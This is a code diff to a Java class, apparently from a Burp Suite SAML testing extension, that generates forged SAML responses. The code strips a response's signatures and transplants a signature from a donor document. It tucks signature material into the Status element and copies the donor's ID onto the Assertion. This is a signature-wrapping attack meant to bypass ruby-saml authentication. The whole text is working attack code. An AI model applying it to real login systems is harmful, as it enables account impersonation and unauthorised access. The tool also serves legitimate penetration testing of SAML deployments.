@@ -9,9 +9,7 @@ import org.w3c.dom.NodeList;
 import java.io.IOException;
 import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
-import java.util.ArrayList;
 import java.util.Base64;
-import java.util.List;
 
 import static burp.utilities.helpers.Constants.DS_NAMESPACE;
 import static burp.utilities.helpers.Constants.XMLNS;
@@ -22,11 +20,12 @@ public class RubySAMLVoidWrapper {
 
     }
 
-    public static String apply(Document document) throws IOException {
+    public static String apply(Document document, Document src) throws IOException {
         XMLHelpers xmlHelpers = XMLHelpers.getInstance();
 
         // Step 0: clone
         Document newDoc = (Document) document.cloneNode(true);
+        Document source = (Document) src.cloneNode(true);
 
         Element newResponse = (Element) newDoc.getElementsByTagNameNS("*", "Response").item(0);
         Element newAssertion = (Element) newDoc.getElementsByTagNameNS("*", "Assertion").item(0);
@@ -38,49 +37,20 @@ public class RubySAMLVoidWrapper {
         if (newAssertion == null) {
             throw new IllegalArgumentException("No <Assertion> element found.");
         }
+        Element signature = null;
 
-        Element signatureForResponse = null;
-        Element signatureForAssertion = null;
-
-        List<Element> signatureElements = new ArrayList<>();
-        NodeList signatureNodes = newDoc.getElementsByTagNameNS("*", "Signature");
-        for (int i = 0; i < signatureNodes.getLength(); i++) {
-            signatureElements.add((Element) signatureNodes.item(i));
+        Element sourceRoot = source.getDocumentElement();
+        NodeList sourceSignatures = sourceRoot.getElementsByTagNameNS("*", "Signature");
+        if (sourceSignatures.getLength() > 0) {
+            signature = (Element) sourceSignatures.item(0);
         }
 
-        for (Element sig : signatureElements) {
-            NodeList referenceNodes = sig.getElementsByTagNameNS("*", "Reference");
-            if (referenceNodes.getLength() == 0) continue;
-
-            Element reference = (Element) referenceNodes.item(0);
-            String refURI = reference.getAttribute("URI").substring(1);
-
-            Element target = null;
-            NodeList allElements = newDoc.getElementsByTagName("*");
-            for (int j = 0; j < allElements.getLength(); j++) {
-                Element el = (Element) allElements.item(j);
-                if (el.hasAttribute("ID") && el.getAttribute("ID").equals(refURI)) {
-                    target = el;
-                    break;
-                }
-            }
-
-            if (target == null) continue;
-
-            if ("Response".equals(target.getLocalName())) {
-                signatureForResponse = sig;
-            } else if ("Assertion".equals(target.getLocalName())) {
-                signatureForAssertion = sig;
-            }
-
-            Node parent = sig.getParentNode();
-            if (parent != null) {
-                parent.removeChild(sig);
-            }
+        if (signature == null) {
+            throw new IllegalArgumentException("No signature found in donor document.");
         }
 
-        Element sourceSignature = (signatureForAssertion != null) ? signatureForAssertion : signatureForResponse;
-        if (sourceSignature == null) throw new IllegalArgumentException("No <Signature> element found.");
+        xmlHelpers.removeAllSignatures(newDoc);
+        Element sourceSignature = (Element) newDoc.importNode(signature, true);
 
         Element sigForAssertion = buildSignatureElement(newDoc, sourceSignature);
 
@@ -99,7 +69,7 @@ public class RubySAMLVoidWrapper {
         }
 
         newAssertion.insertBefore(sigForAssertion, firstChild.getNextSibling());
-        newAssertion.setAttributeNS(XMLNS, "xmlns:example", "31337");
+        newAssertion.setAttributeNS(XMLNS, "xmlns:ns", "1");
 
         String namePrefix = sourceSignature.getPrefix();
         String signatureNamespace = sourceSignature.getNamespaceURI();
@@ -118,33 +88,7 @@ public class RubySAMLVoidWrapper {
 
         // We can use samlp:Extensions or samlp:Status/samlp:StatusDetail Nodes
         Element status = (Element) newResponse.getElementsByTagNameNS("*", "Status").item(0);
-        Element extensions = (Element) newResponse.getElementsByTagNameNS("*", "Extensions").item(0);
-        if (extensions == null) {
-            String responsePrefix = newResponse.getPrefix();
-            String responseNamespace = newResponse.getNamespaceURI();
-            String qualifiedName = (responsePrefix != null && !responsePrefix.isEmpty())
-                    ? responsePrefix + ":Extensions"
-                    : "Extensions";
-            Element extension = newDoc.createElementNS(responseNamespace, qualifiedName);
-            insertAfter(extension, newResponse.getFirstChild(), newResponse);
-
-            Element reveal = newDoc.createElement("Reveal");
-            Element conceal = newDoc.createElement("Conceal");
-
-            reveal.setAttribute("xmlns", DS_NAMESPACE);
-            conceal.setAttribute("xml:xmlns", "http://www.w3.org/2000/09/xmldsig_#");
-            extension.appendChild(reveal);
-            reveal.appendChild(conceal);
-            Element newSig = newDoc.createElement("Signature");
-            NodeList children = sourceSignature.getChildNodes();
-
-            for (int i = 0; i < children.getLength(); i++) {
-                Node imported = newDoc.importNode(children.item(i), true);
-                newSig.appendChild(imported);
-            }
-            conceal.appendChild(newSig);
-
-        } else if (status != null) {
+        if (status != null) {
             String statusPrefix = status.getPrefix();
             String statusNamespace = status.getNamespaceURI();
 
@@ -175,27 +119,10 @@ public class RubySAMLVoidWrapper {
             throw new IllegalArgumentException("Document doesn't have extensibility objects.");
         }
 
-        if (signatureForAssertion == null) {
-            String referenceURI = null;
-            NodeList referenceList = sourceSignature.getElementsByTagNameNS("*", "Reference");
-            Element referenceElement = (Element) referenceList.item(0);
-            if (referenceElement != null && referenceElement.hasAttribute("URI")) {
-                referenceURI = referenceElement.getAttribute("URI").substring(1);
-            }
-            newAssertion.setAttribute("ID", referenceURI);
-            newResponse.setAttribute("ID", referenceURI + "ffff");
-        }
+        String originalAssertionID = sourceRoot.getAttribute("ID");
+        newAssertion.setAttribute("ID", originalAssertionID);
 
         return xmlHelpers.getString(newDoc, 0, true);
-    }
-
-    private static void insertAfter(Node newNode, Node refNode, Node parent) {
-        Node next = refNode.getNextSibling();
-        if (next != null) {
-            parent.insertBefore(newNode, next);
-        } else {
-            parent.appendChild(newNode);
-        }
     }
 
     private static Element buildSignatureElement(Document doc, Element sourceSignature) {
